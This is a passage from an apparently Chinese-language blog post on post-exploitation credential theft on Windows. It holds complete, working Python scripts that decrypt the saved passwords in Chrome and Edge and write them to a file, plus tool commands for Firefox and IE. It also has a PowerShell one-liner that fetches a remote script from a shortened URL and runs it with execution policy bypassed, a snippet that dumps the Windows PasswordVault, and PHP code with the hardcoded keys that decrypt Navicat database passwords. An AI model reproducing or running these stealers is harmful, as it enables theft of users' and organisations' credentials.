[]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_chrome_db</span>(<span class="params">self</span>):</span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_password</span>(<span class="params">self,db_file</span>):</span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            <span class="comment"># print(type(row[2]))</span></span><br><span class="line">            host = row[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> host.startswith(<span class="string">&#x27;android&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            name = row[<span class="number">1</span>]</span><br><span class="line">            value = self.chrome_decrypt(row[<span class="number">2</span>])<span class="comment">######加密方式改變后的重點位置</span></span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %(host,name,value)</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">chrome_decrypt</span>(<span class="params">self,encrypted_txt</span>):</span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&#x27;win32&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> encrypted_txt[:<span class="number">4</span>] == <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span>:</span><br><span class="line">                    decrypted_txt = dpapi_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt.decode()</span><br><span class="line">                <span class="keyword">elif</span> encrypted_txt[:<span class="number">3</span>] == <span class="string">b&#x27;v10&#x27;</span>:</span><br><span class="line">                    decrypted_txt = aes_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt[:-<span class="number">16</span>].decode()</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unix_decrypt(encrypted_txt)</span><br><span class="line">            <span class="keyword">except</span> NotImplementedError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_passwords</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h3 id="Firefox浏览器数据"><a href="#Firefox浏览器数据" class="headerlink" title="Firefox浏览器数据"></a>Firefox浏览器数据</h3><p>所有的密码保存位置在<code>%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\</code>(xxxxxxxx为8位随机字母和数字的组合)</p><p>不同版本的Firefox保存记录的文件名称不同，具体区别如下：</p><ul><li><p>Version大于等于32.0，保存记录的文件为logins.json</p></li><li><p>Version大于等于3.5，小于32.0，保存记录的文件为signons.sqlite</p></li></ul><p>不同版本的Firefox密钥文件的位置不同，具体区别如下：</p><ul><li><p>Version小于58.0.2，密钥文件为key3.db</p></li><li><p>Version大于等于58.0.2，密钥文件为key4.db</p></li></ul><p>默认情况下，当前用户的权限可以查看Firefox浏览器中保存的所有密码，为了提高安全性，Firefox浏览器支持为保存的密码添加额外的保护：设置Master Password。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/11.png" alt="image-20210609191949114"></p><p>添加Master Password后，查看保存的密码需要额外输入Master Password。</p><p>解密流程：</p><ul><li><p>读取密钥文件(key4.db或key3.db)，获得key和iv</p></li><li><p>读取记录文件(logins.json或signons.sqlite)的内容</p></li><li><p>如果未设置Master Password，使用key和iv对记录文件中的加密内容进行3DES-CBC解密。如果设置Master Password，还需要获得明文形式的Master Password，才能进行解密</p></li></ul><blockquote><p>未设置Master Password解密</p></blockquote><p>WebBrowserPassView：<a href="https://www.nirsoft.net/password_recovery_tools.html">官方下载</a> <a href="https://github.com/Ascotbe/Image/blob/master/WindowsGrabPassword/WebBrowserPassView.exe">备份下载</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\WebBrowserPassView.exe /LoadPasswordsFirefox 1 /shtml &quot;C:\Users\ascotbe\Desktop\passwords.html&quot;</span><br></pre></td></tr></table></figure><p>还能把谷歌最新版本的秘钥给解密了</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/12.png" alt="image-20210609192420620"></p><blockquote><p>设置Master Password解密</p></blockquote><p>firefox_decrypt：<a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0">官方下载</a></p><p>解密需要获取到用户设置的Master Password才行，解密工具别使用1.0版本，问题很多</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/13.png" alt="image-20210609194828114"></p><h3 id="IE-浏览器数据"><a href="#IE-浏览器数据" class="headerlink" title="IE 浏览器数据"></a>IE 浏览器数据</h3><p>首先需要打开浏览器的记住密码功能：工具-&gt;Internet 选项-&gt;内容-&gt;自动完成-&gt;勾选表单上的用户名和密码</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/14.png" alt="image-20210610095248052"></p><blockquote><p>远程下载执行（需要开启PS可执行）</p></blockquote><p>直接使用命令，目前GitHub国内无法访问，推荐使用自己服务器存放脚本或者使用第三方源</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://bit.ly/2K75g15&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/15.png" alt="image-20210610100850268"></p><blockquote><p>本地执行（需要开启PS可执行）</p></blockquote><p>直接把PS1文件放到目标机器上，执行就好了</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="built_in">void</span>][<span class="type">Windows.Security.Credentials.PasswordVault</span>,<span class="type">Windows.Security.Credentials</span>,<span class="type">ContentType</span>=<span class="type">WindowsRuntime</span>]</span><br><span class="line"><span class="variable">$vault</span> = <span class="built_in">New-Object</span> Windows.Security.Credentials.PasswordVault</span><br><span class="line"><span class="variable">$vault</span>.RetrieveAll() | % &#123; <span class="variable">$_</span>.RetrievePassword();<span class="variable">$_</span> &#125; | <span class="built_in">select</span> username,resource,password</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/16.png" alt="image-20210610101513741"></p><blockquote><p>落地文件执行</p></blockquote><p>IE PassView：<a href="https://www.nirsoft.net/utils/internet_explorer_password.html">官方下载</a>  <a href="https://github.com/Ascotbe/Image/blob/master/WindowsGrabPassword/ViewPass.exe">备份下载</a></p><p>直接把文件双击即可看到密码</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/17.png" alt="image-20210610105509664"></p><h3 id="Edge浏览器数据"><a href="#Edge浏览器数据" class="headerlink" title="Edge浏览器数据"></a>Edge浏览器数据</h3><p>由于微软就套了一层壳，加密方式完全没有修改，值修改了数据保存的路径，所以我们修改上面Chrome的脚本即可获取成功</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">#数据库路径</span><br><span class="line">C:\Users\ascotbe\AppData\Local\Microsoft\Edge\User Data\Default\Login Data</span><br><span class="line">#秘钥路径</span><br><span class="line">C:\Users\ascotbe\AppData\Local\Microsoft\Edge\User Data\Local State</span><br></pre></td></tr></table></figure><p>脚本修改如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json,base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> (</span><br><span class="line">    Cipher, algorithms, modes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Microsoft\Edge\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NONCE_BYTE_SIZE = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">cipher, plaintext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext)</span><br><span class="line">    <span class="keyword">return</span> (cipher, ciphertext, nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, ciphertext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    <span class="keyword">return</span> decryptor.update(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cipher</span>(<span class="params">key</span>):</span><br><span class="line">    cipher = Cipher(</span><br><span class="line">        algorithms.AES(key),</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dpapi_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">import</span> ctypes</span><br><span class="line">    <span class="keyword">import</span> ctypes.wintypes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">DATA_BLOB</span>(ctypes.Structure):</span><br><span class="line">        _fields_ = [(<span class="string">&#x27;cbData&#x27;</span>, ctypes.wintypes.DWORD),</span><br><span class="line">                    (<span class="string">&#x27;pbData&#x27;</span>, ctypes.POINTER(ctypes.c_char))]</span><br><span class="line"></span><br><span class="line">    p = ctypes.create_string_buffer(encrypted, <span class="built_in">len</span>(encrypted))</span><br><span class="line">    blobin = DATA_BLOB(ctypes.sizeof(p), p)</span><br><span class="line">    blobout = DATA_BLOB()</span><br><span class="line">    retval = ctypes.windll.crypt32.CryptUnprotectData(</span><br><span class="line">        ctypes.byref(blobin), <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>, ctypes.byref(blobout))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> retval:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    result = ctypes.string_at(blobout.pbData, blobout.cbData)</span><br><span class="line">    ctypes.windll.kernel32.LocalFree(blobout.pbData)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unix_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">&#x27;linux&#x27;</span>):</span><br><span class="line">        password = <span class="string">&#x27;peanuts&#x27;</span></span><br><span class="line">        iterations = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">    salt = <span class="string">&#x27;saltysalt&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    length = <span class="number">16</span></span><br><span class="line">    key = PBKDF2(password, salt, length, iterations)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, IV=iv)</span><br><span class="line">    decrypted = cipher.decrypt(encrypted[<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted[:-<span class="built_in">ord</span>(decrypted[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key_from_local_state</span>():</span><br><span class="line">    jsn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>],</span><br><span class="line">        <span class="string">r&quot;Microsoft\Edge\User Data\Local State&quot;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>,mode =<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsn = json.loads(<span class="built_in">str</span>(f.readline()))</span><br><span class="line">    <span class="keyword">return</span> jsn[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">encrypted_txt</span>):</span><br><span class="line">    encoded_key = get_key_from_local_state()</span><br><span class="line">    encrypted_key = base64.b64decode(encoded_key.encode())</span><br><span class="line">    encrypted_key = encrypted_key[<span class="number">5</span>:]</span><br><span class="line">    key = dpapi_decrypt(encrypted_key)</span><br><span class="line">    nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">    cipher = get_cipher(key)</span><br><span class="line">    <span class="keyword">return</span> decrypt(cipher,encrypted_txt[<span class="number">15</span>:],nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChromePassword</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_chrome_db</span>(<span class="params">self</span>):</span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_password</span>(<span class="params">self,db_file</span>):</span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            <span class="comment"># print(type(row[2]))</span></span><br><span class="line">            host = row[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> host.startswith(<span class="string">&#x27;android&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            name = row[<span class="number">1</span>]</span><br><span class="line">            value = self.chrome_decrypt(row[<span class="number">2</span>])<span class="comment">######加密方式改變后的重點位置</span></span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %(host,name,value)</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">chrome_decrypt</span>(<span class="params">self,encrypted_txt</span>):</span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&#x27;win32&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> encrypted_txt[:<span class="number">4</span>] == <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span>:</span><br><span class="line">                    decrypted_txt = dpapi_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt.decode()</span><br><span class="line">                <span class="keyword">elif</span> encrypted_txt[:<span class="number">3</span>] == <span class="string">b&#x27;v10&#x27;</span>:</span><br><span class="line">                    decrypted_txt = aes_decrypt(encrypted_txt)</span><br><span class="line">                    <span class="keyword">return</span> decrypted_txt[:-<span class="number">16</span>].decode()</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unix_decrypt(encrypted_txt)</span><br><span class="line">            <span class="keyword">except</span> NotImplementedError:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_passwords</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h2 id="数据库密码"><a href="#数据库密码" class="headerlink" title="数据库密码"></a>数据库密码</h2><h3 id="Navicat密码"><a href="#Navicat密码" class="headerlink" title="Navicat密码"></a>Navicat密码</h3><p>目前测试只能解密11和12两个版本，其他版本未测试</p><div class="table-container"><table><thead><tr><th style="text-align:left">数据库类型</th><th style="text-align:center">注册表路径</th></tr></thead><tbody><tr><td style="text-align:left">MySQL</td><td style="text-align:center">HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers</td></tr><tr><td style="text-align:left">MariaDB</td><td style="text-align:center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers</td></tr><tr><td style="text-align:left">MongoDB</td><td style="text-align:center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers</td></tr><tr><td style="text-align:left">Microsoft SQL</td><td style="text-align:center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers</td></tr><tr><td style="text-align:left">Oracle</td><td style="text-align:center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers</td></tr><tr><td style="text-align:left">PostgreSQL</td><td style="text-align:center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers</td></tr><tr><td style="text-align:left">SQLite</td><td style="text-align:center">HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers</td></tr></tbody></table></div><h4 id="能RDP连接到机器"><a href="#能RDP连接到机器" class="headerlink" title="能RDP连接到机器"></a>能RDP连接到机器</h4><p>当前已Mysql作为测试样例，通过注册列表中查看，位置如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers\</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/18.png" alt="image-20210610163933891"></p><p>接着把加密的密码复制出来进行解密，脚本如下，如果本机没有PHP环境可以使用<a href="https://tool.lu/coderunner/">在线网站</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">FatSmallTools</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NavicatPassword</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$version</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesKey</span> = <span class="string">&#x27;libcckeylibcckey&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesIv</span> = <span class="string">&#x27;libcciv libcciv &#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowString</span> = <span class="string">&#x27;3DC5CA39&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowKey</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowIv</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$version</span> = <span class="number">12</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;version = <span class="variable">$version</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blowKey = <span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;3DC5CA39&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blowIv = <span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;d9c7c3c8870d64bd&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptEleven</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptTwelve</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptEleven</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$round</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptBlock</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>), <span class="variable">$currentVector</span>));</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="variable">$currentVector</span>, <span class="variable">$temp</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptBlock</span>(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="variable">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="variable">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">xorBytes</span>(<span class="params"><span class="variable">$str1</span>, <span class="variable">$str2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str1</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str1</span>[<span class="variable">$i</span>]) ^ <span class="title function_ invoke__">ord</span>(<span class="variable">$str2</span>[<span class="variable">$i</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptTwelve</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="variable">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="variable">$this</span>-&gt;aesIv);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span 